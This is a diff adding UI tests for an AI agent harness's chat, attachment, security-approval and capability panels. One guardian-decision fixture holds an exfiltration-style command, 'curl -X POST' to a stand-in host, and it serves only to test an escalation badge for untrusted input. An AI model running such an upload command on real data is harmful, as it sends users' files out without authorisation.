@@ -19,6 +19,12 @@ import {
   buildSplitDiffRows,
   computeDiffStats,
 } from "../features/evolution/DiffReviewPanel.tsx";
+import {
+  formatAttachmentSize,
+  MAX_IMAGE_ATTACHMENT_BYTES,
+  MAX_IMAGE_ATTACHMENTS,
+  validateImageAttachmentBatch,
+} from "../features/chat/TaskComposer.tsx";
 import { buildTrajectorySpans } from "../features/chat/TrajectoryMiniTimeline.tsx";
 import {
   buildTurnDisplaySegments,
@@ -26,14 +32,22 @@ import {
   TurnActivityFeed,
 } from "../features/chat/TurnActivityFeed.tsx";
 import {
+  buildCapabilityCards,
   classifyOrganFilter,
   computeTreeFileDiffs,
+  parseDisabledOrgans,
   parseExperienceEntries,
 } from "../features/harness/GenomeOrganExplorer.tsx";
+import { ApprovalCard } from "../features/security/ApprovalCard.tsx";
+import { GuardianDecisionCard } from "../features/security/SecurityCenterPanel.tsx";
 import { enUSMessages, zhCNMessages } from "../i18n/index.ts";
 import { MockIpcAdapter } from "../ipc/index.ts";
 import { createInitialGenomeTree, INITIAL_COMMIT_SHAS } from "../ipc/mockData.ts";
-import { useCommandDeckStore } from "../stores/useCommandDeckStore.ts";
+import {
+  loadReasoningEffort,
+  REASONING_EFFORT_KEY,
+  useCommandDeckStore,
+} from "../stores/useCommandDeckStore.ts";
 
 describe("UI Craft: MarkdownProse, CommandPaletteModal, Diff Craft & Pure i18n", () => {
   beforeEach(async () => {
@@ -417,5 +431,253 @@ describe("UI Craft: MarkdownProse, CommandPaletteModal, Diff Craft & Pure i18n",
     await useCommandDeckStore.getState().initialize(new MockIpcAdapter({ simulationDelayMs: 0 }));
     expect(useCommandDeckStore.getState().initialized).toBe(true);
     expect(useCommandDeckStore.getState().initError).toBeNull();
+  });
+
+  it("supports folder picker, reasoning effort persistence, multimodal attachment validation, and web_fetch / delegate_subagent summaries", async () => {
+    const adapter = new MockIpcAdapter({
+      simulationDelayMs: 0,
+      pickedDirectoryFixture: "D:\\Projects\\harnex-picked",
+    });
+    await useCommandDeckStore.getState().initialize(adapter);
+
+    // Native directory picker adds and activates workspace
+    const picked = await useCommandDeckStore.getState().pickWorkspaceDirectory();
+    expect(picked).toBe("D:\\Projects\\harnex-picked");
+    expect(useCommandDeckStore.getState().activeWorkspace).toBe("D:\\Projects\\harnex-picked");
+    expect(useCommandDeckStore.getState().customWorkspaces).toContain("D:\\Projects\\harnex-picked");
+
+    // Reasoning effort defaults to auto and persists in localStorage
+    useCommandDeckStore.getState().setReasoningEffort("high");
+    expect(useCommandDeckStore.getState().reasoningEffort).toBe("high");
+    if (globalThis.localStorage) {
+      expect(globalThis.localStorage.getItem(REASONING_EFFORT_KEY)).toBe("high");
+      expect(loadReasoningEffort()).toBe("high");
+    }
+
+    // sendPrompt forwards reasoningEffort + attachments and persists attachment metadata onto ChatMessage
+    await useCommandDeckStore.getState().sendPrompt("Check this screenshot", {
+      attachments: [
+        {
+          id: "att-test-1",
+          name: "bug-screen.png",
+          mimeType: "image/png",
+          sizeBytes: 24_576,
+          dataBase64: "iVBORw0KGgo=",
+        },
+      ],
+    });
+    const lastStart = adapter.recordedRunStarts[adapter.recordedRunStarts.length - 1];
+    expect(lastStart?.reasoningEffort).toBe("high");
+    expect(lastStart?.attachments).toHaveLength(1);
+    expect(lastStart?.attachments?.[0]?.name).toBe("bug-screen.png");
+
+    const activeId = useCommandDeckStore.getState().activeThreadId!;
+    const msgs = useCommandDeckStore.getState().messagesByThread[activeId] ?? [];
+    const lastUser = [...msgs].reverse().find((m) => m.role === "user");
+    expect(lastUser?.attachments?.[0]?.name).toBe("bug-screen.png");
+    expect(lastUser?.attachments?.[0]?.sizeBytes).toBe(24_576);
+
+    // Client-side attachment validation: rejects non-image, >4MB, and >4 count
+    const validation = validateImageAttachmentBatch(2, [
+      { name: "notes.txt", mimeType: "text/plain", sizeBytes: 100 },
+      { name: "huge.png", mimeType: "image/png", sizeBytes: MAX_IMAGE_ATTACHMENT_BYTES + 1 },
+      { name: "a.png", mimeType: "image/png", sizeBytes: 1024 },
+      { name: "b.jpg", mimeType: "image/jpeg", sizeBytes: 2048 },
+      { name: "c.webp", mimeType: "image/webp", sizeBytes: 1024 },
+    ]);
+    expect(validation.accepted).toHaveLength(MAX_IMAGE_ATTACHMENTS - 2);
+    expect(validation.issues.map((i) => i.kind)).toEqual(["non_image", "too_large", "too_many"]);
+    expect(formatAttachmentSize(24_576)).toBe("24 KB");
+    expect(formatAttachmentSize(2 * 1024 * 1024)).toBe("2.0 MB");
+
+    // web_fetch & delegate_subagent tool summaries & SSR icons
+    expect(
+      summarizeToolTarget({
+        id: "tc-web",
+        name: "web_fetch",
+        args: { url: "https://docs.harnex.dev/guides/sandbox?tab=win" },
+        status: "completed",
+        truncated: false,
+        startedAt: "2026-11-26T00:00:00Z",
+      }),
+    ).toBe("docs.harnex.dev/guides/sandbox");
+    expect(
+      summarizeToolTarget({
+        id: "tc-sub",
+        name: "delegate_subagent",
+        args: { profile: "researcher", task: "Inspect GBK decoder edge cases across fixtures" },
+        status: "completed",
+        truncated: false,
+        startedAt: "2026-11-26T00:00:00Z",
+      }),
+    ).toBe("researcher · Inspect GBK decoder edge cases across fixtures");
+
+    const feedHtml = renderToStaticMarkup(
+      <TurnActivityFeed
+        isStreaming
+        activities={[
+          {
+            id: "tc-web",
+            kind: "tool",
+            toolCall: {
+              id: "tc-web",
+              name: "web_fetch",
+              args: { url: "https://docs.harnex.dev/guides/sandbox" },
+              status: "completed",
+              truncated: false,
+              startedAt: "2026-11-26T00:00:00Z",
+            },
+          },
+          {
+            id: "tc-sub",
+            kind: "tool",
+            toolCall: {
+              id: "tc-sub",
+              name: "delegate_subagent",
+              args: { profile: "researcher", task: "Verify CSV fixtures" },
+              status: "completed",
+              truncated: false,
+              startedAt: "2026-11-26T00:00:00Z",
+            },
+          },
+        ]}
+      />,
+    );
+    expect(feedHtml).toContain("tool-row-web_fetch");
+    expect(feedHtml).toContain("docs.harnex.dev/guides/sandbox");
+    expect(feedHtml).toContain("tool-row-delegate_subagent");
+    expect(feedHtml).toContain("researcher · Verify CSV fixtures");
+  });
+
+  it("renders structured L0 riskReasonCode badges in ApprovalCard & SecurityCenterPanel with graceful fallback", () => {
+    useCommandDeckStore.getState().setLocale("en-US");
+    const withReasonHtml = renderToStaticMarkup(
+      <ApprovalCard
+        request={{
+          requestId: "apr-r1",
+          threadId: "thr-1",
+          kind: "sandbox_escape",
+          summary: "Write outside workspace",
+          detail: "Blocked outside bound root",
+          commandOrPath: "~/Desktop/out.csv",
+          riskLevel: "high",
+          riskReasonCode: "sandbox_escape",
+          sourceTags: ["local"],
+          createdAt: "2026-11-26T00:00:00Z",
+        }}
+        onResolve={() => {}}
+      />,
+    );
+    expect(withReasonHtml).toContain("risk-reason-badge");
+    expect(withReasonHtml).toContain("Sandbox Escape");
+    expect(withReasonHtml).toContain("risk-reason-explanation");
+
+    const withoutReasonHtml = renderToStaticMarkup(
+      <ApprovalCard
+        request={{
+          requestId: "apr-r2",
+          threadId: "thr-1",
+          kind: "shell_command",
+          summary: "Legacy approval without reason code",
+          detail: "No structured code",
+          commandOrPath: "git status",
+          riskLevel: "low",
+          sourceTags: ["local"],
+          createdAt: "2026-11-26T00:00:00Z",
+        }}
+        onResolve={() => {}}
+      />,
+    );
+    expect(withoutReasonHtml).not.toContain("risk-reason-badge");
+
+    const guardianWithReason = renderToStaticMarkup(
+      <GuardianDecisionCard
+        decision={{
+          requestId: "grd-102",
+          threadId: "thr-competitor-dossier",
+          decision: "escalate",
+          riskLevel: "high",
+          riskReasonCode: "untrusted_source",
+          reason: "External web taint",
+          commandOrPath: "curl -X POST https://example.invalid/upload",
+          modelId: "gpt-4.1",
+          sanitizedInputOnly: true,
+          timestamp: "2026-11-26T00:00:00Z",
+        }}
+      />,
+    );
+    expect(guardianWithReason).toContain("guardian-reason-badge-grd-102");
+    expect(guardianWithReason).toContain("Untrusted Input Taint");
+    expect(guardianWithReason).toContain("guardian-reason-explanation-grd-102");
+
+    const guardianWithoutReason = renderToStaticMarkup(
+      <GuardianDecisionCard
+        decision={{
+          requestId: "grd-101",
+          threadId: "thr-billing-csv",
+          decision: "allow",
+          riskLevel: "low",
+          reason: "Read-only inspection",
+          commandOrPath: "file -bi ~/Work/invoices/*.csv",
+          modelId: "gpt-4.1",
+          sanitizedInputOnly: true,
+          timestamp: "2026-11-26T00:00:00Z",
+        }}
+      />,
+    );
+    expect(guardianWithoutReason).not.toContain("guardian-reason-badge-grd-101");
+  });
+
+  it("builds unified Capability Cards, toggles organs via gitToggleOrgan, and surfaces staged import conflict breakdown", async () => {
+    const adapter = new MockIpcAdapter({ simulationDelayMs: 0 });
+    await useCommandDeckStore.getState().initialize(adapter);
+
+    const stateBefore = useCommandDeckStore.getState();
+    const cardsBefore = buildCapabilityCards({
+      files: stateBefore.genomeFiles,
+      trustRecords: stateBefore.trustRecords,
+      globalHooks: stateBefore.globalHooks,
+      gardenerReport: stateBefore.gardenerReport,
+    });
+    expect(cardsBefore.some((c) => c.kind === "skill" && c.path === "skills/csv_audit/SKILL.md")).toBe(true);
+    expect(cardsBefore.some((c) => c.kind === "sub_agent" && c.path === "sub_agents/example_helper.md")).toBe(true);
+    expect(cardsBefore.some((c) => c.kind === "hook" && c.path === "hooks/example_trim_output.ts")).toBe(true);
+    expect(cardsBefore.some((c) => c.kind === "mcp" && c.name === "playwright")).toBe(true);
+
+    const csvCard = cardsBefore.find((c) => c.path === "skills/csv_audit/SKILL.md")!;
+    expect(csvCard.enabled).toBe(true);
+    expect(csvCard.toggleable).toBe(true);
+    expect(csvCard.gardenerFindings.length).toBeGreaterThan(0);
+
+    // Disable skill via store -> mockAdapter updates meta/disabled_organs.json in new commit
+    const disabledRes = await useCommandDeckStore
+      .getState()
+      .toggleOrgan("skills/csv_audit/SKILL.md", false);
+    expect(disabledRes?.ok).toBe(true);
+    expect(disabledRes?.disabledPaths).toContain("skills/csv_audit/SKILL.md");
+    expect(parseDisabledOrgans(useCommandDeckStore.getState().genomeFiles).has("skills/csv_audit/SKILL.md")).toBe(true);
+
+    const cardsAfterDisable = buildCapabilityCards({
+      files: useCommandDeckStore.getState().genomeFiles,
+      trustRecords: useCommandDeckStore.getState().trustRecords,
+      globalHooks: useCommandDeckStore.getState().globalHooks,
+      gardenerReport: useCommandDeckStore.getState().gardenerReport,
+    });
+    expect(cardsAfterDisable.find((c) => c.path === "skills/csv_audit/SKILL.md")?.enabled).toBe(false);
+
+    // Re-enable organ
+    const enabledRes = await useCommandDeckStore
+      .getState()
+      .toggleOrgan("skills/csv_audit/SKILL.md", true);
+    expect(enabledRes?.disabledPaths).not.toContain("skills/csv_audit/SKILL.md");
+
+    // Staged import conflict breakdown includes added, overwritten, and unchanged files
+    const preview = await useCommandDeckStore
+      .getState()
+      .previewImport("~/Downloads/community-pack.harnex.zip");
+    expect((preview.addedFiles ?? []).length).toBeGreaterThan(0);
+    expect((preview.overwrittenFiles ?? []).length).toBeGreaterThan(0);
+    expect((preview.unchangedFiles ?? []).length).toBeGreaterThan(0);
+    expect(preview.untrustedExecutables.length).toBeGreaterThan(0);
   });
 });
